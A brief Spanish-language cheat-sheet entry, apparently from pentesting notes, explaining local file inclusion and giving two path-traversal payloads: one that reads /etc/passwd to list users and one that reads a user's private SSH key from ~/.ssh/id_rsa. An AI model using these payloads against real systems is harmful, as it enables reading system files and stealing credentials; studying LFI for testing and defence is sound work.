Cuando dentro de la URL como parámetro se llama a un archivo, estamos ante un local file inclusion.

Si retrocedemos hasta la carpeta raíz del sistema podremos leer el contenido de diferentes archivos que serán de valor en la explotación

# Ver usuarios exixstentes
```HTTP
<"URL">=../../../../../../../../../../../../../etc/passwd
```
# Ves clave SSH
```HTTP
<"URL">=../../../../../../../../../../../../../home/<"Usuario">/.ssh/id_rsa
```